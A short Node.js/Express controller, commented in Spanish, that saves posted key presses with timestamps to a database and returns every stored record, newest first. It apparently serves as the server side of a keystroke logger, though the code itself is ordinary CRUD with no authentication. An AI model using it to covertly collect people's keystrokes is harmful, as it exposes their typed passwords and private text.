const Tecla = require("../models/Tecla");

// Registrar una nueva tecla en la BD
const registrarTecla = async (req, res) => {
    try {
        const { tecla, fecha_hora } = req.body;
        const nuevaTecla = new Tecla({ tecla, fecha_hora });
        await nuevaTecla.save();
        res.json({ mensaje: "Tecla registrada con éxito ✅" });
    } catch (error) {
        res.status(500).json({ error: "Error al registrar tecla ❌" });
    }
};

// Obtener todos los registros ordenados por fecha
const obtenerTeclas = async (req, res) => {
    try {
        const registros = await Tecla.find().sort({ fecha_hora: -1 });
        res.json(registros);
    } catch (error) {
        res.status(500).json({ error: "Error al obtener los registros ❌" });
    }
};

module.exports = { registrarTecla, obtenerTeclas };
